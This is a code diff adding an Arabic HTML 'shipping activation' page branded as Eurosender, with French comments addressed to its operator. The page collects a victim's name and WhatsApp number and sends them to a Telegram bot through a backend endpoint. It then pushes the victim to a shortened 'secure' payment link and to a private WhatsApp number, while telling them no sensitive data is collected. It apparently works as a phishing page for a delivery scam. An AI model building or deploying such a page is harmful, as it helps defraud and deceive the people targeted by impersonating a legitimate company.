@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Eurosender × The21st.co — تفعيل</title>
+  <style>
+    body{font-family:system-ui;background:#0b0f14;color:#e5e7eb;margin:0;padding:24px}
+    .card{max-width:520px;margin:auto;background:#111827;border:1px solid #ffffff14;border-radius:14px;padding:18px}
+    label{display:block;margin:10px 0 6px;color:#cbd5e1}
+    input,select{width:100%;padding:12px;border-radius:10px;border:1px solid #ffffff22;background:#0f1623;color:#e5e7eb}
+    button,a.btn{display:inline-block;margin-top:14px;padding:12px 16px;border-radius:10px;border:none;background:#22c55e;color:#052e1a;font-weight:700;text-decoration:none}
+    .muted{color:#9ca3af;font-size:12px;margin-top:6px}
+    .ok,.err{display:none;margin-top:10px;padding:10px;border-radius:8px}
+    .ok{background:#052e1a;color:#d1fae5}.err{background:#3b0a0a;color:#fecaca}
+    .actions{display:flex;gap:10px;flex-wrap:wrap}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Eurosender × The21st.co</h2>
+    <p>يرجى تأكيد البيانات ثم الضغط على زر <b>إرسال إلى البوت</b>. بعد الإرسال سيتم فتح واتساب تلقائيًا للتأكيد.</p>
+
+    <label>الاسم الكامل</label>
+    <input id="fullName" placeholder="مثال: محمد بن علي" required>
+
+    <label>رقم الجوال (واتساب)</label>
+    <input id="phone" placeholder="9665XXXXXXXX" required>
+
+    <label>طريقة التوصيل</label>
+    <select id="delivery" required>
+      <option value="">— اختر الخيار —</option>
+      <option>التوصيل العادي</option>
+      <option>التوصيل السريع</option>
+      <option>التوصيل المميز مع التأمين</option>
+    </select>
+
+    <div class="actions">
+      <button id="sendToBotBtn" type="button">إرسال إلى البوت</button>
+
+      <!-- Lien de paiement (Jotform/bitly) -->
+      <a class="btn" id="payLink" href="https://bit.ly/4muKMRL" target="_blank" rel="noopener">
+        متابعة التفعيل عبر الرابط الآمن
+      </a>
+
+      <!-- Lien WhatsApp manuel (en plus de l’ouverture auto) -->
+      <a class="btn" style="background:#38bdf8;color:#0b0f14"
+         href="https://wa.me/447412807758?text=%D8%AA%D9%85%20%D8%AA%D8%B9%D8%A8%D8%A6%D8%A9%20%D8%A7%D9%84%D9%86%D9%85%D9%88%D8%B0%D8%AC%20%D9%88%D8%A5%D8%B1%D8%B3%D8%A7%D9%84%D9%87%20%D8%A5%D9%84%D9%89%20%D8%A7%D9%84%D8%A8%D9%88%D8%AA"
+         target="_blank" rel="noopener">
+        العودة لتأكيد واتساب
+      </a>
+    </div>
+
+    <div id="ok"  class="ok">✅ تم الإرسال إلى البوت، سيتم فتح واتساب الآن للتأكيد…</div>
+    <div id="err" class="err">❌ تعذّر الإرسال، حاول لاحقًا.</div>
+
+    <p class="muted">ملاحظة: لا يتم جمع بيانات حساسة هنا. بعد إتمام الرابط الآمن يرجى تأكيد العملية عبر واتساب.</p>
+  </div>
+
+  <script>
+    // (1) normaliser chiffres arabes/iraniens -> 0-9
+    function normalizeDigits(str=''){
+      const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
+      return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
+    }
+    // (2) message HTML pour Telegram
+    function toTelegramHTML(d){
+      const esc = s => String(s||'').replace(/[<&>]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+      return (
+        `<b>طلب تفعيل الشحن</b>\n`+
+        `— — — — — — — — —\n`+
+        `<b>الاسم:</b> ${esc(d.fullName)}\n`+
+        `<b>الجوال:</b> ${esc(normalizeDigits(d.phone))}\n`+
+        `<b>طريقة التوصيل:</b> ${esc(d.delivery)}\n`+
+        `— — — — — — — — —\n<i>Eurosender × The21st.co</i>`
+      );
+    }
+    // (3) ouverture WhatsApp (auto) — tu peux basculer sur ton lien "message" si tu préfères
+    function openWhatsAppAuto(){
+      // Option A (préremplie - recommandé) :
+      const waNumber = '447412807758'; // ton numéro sans +
+      const message  = 'تم الإرسال إلى البوت، يرجى تأكيد التفعيل. شكراً.';
+      const urlA = `https://wa.me/${waNumber}?text=${encodeURIComponent(message)}`;
+
+      // Option B (ton lien direct Business, sans message prérempli) :
+      // const urlB = 'https://wa.me/message/I77OHUE4I7XSF1';
+
+      window.location.href = urlA; // -> mets urlB si tu préfères.
+    }
+
+    // (4) clic du bouton : POST -> /api/submit (Vercel) puis ouverture WhatsApp
+    document.getElementById('sendToBotBtn').addEventListener('click', async ()=>{
+      const ok=document.getElementById('ok'), err=document.getElementById('err');
+      ok.style.display='none'; err.style.display='none';
+      const data = {
+        fullName: document.getElementById('fullName').value.trim(),
+        phone:    document.getElementById('phone').value.trim(),
+        delivery: document.getElementById('delivery').value.trim(),
+      };
+      if(!data.fullName || !data.phone || !data.delivery){ err.style.display='block'; return; }
+      try{
+        const res = await fetch('/api/submit', {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ payload: toTelegramHTML(data) })
+        });
+        if(!res.ok) throw new Error('bad');
+        ok.style.display='block';
+        setTimeout(openWhatsAppAuto, 500); // ouvre WhatsApp après 0,5s
+      }catch(e){ err.style.display='block'; }
+    });
+  </script>
+</body>
+</html>
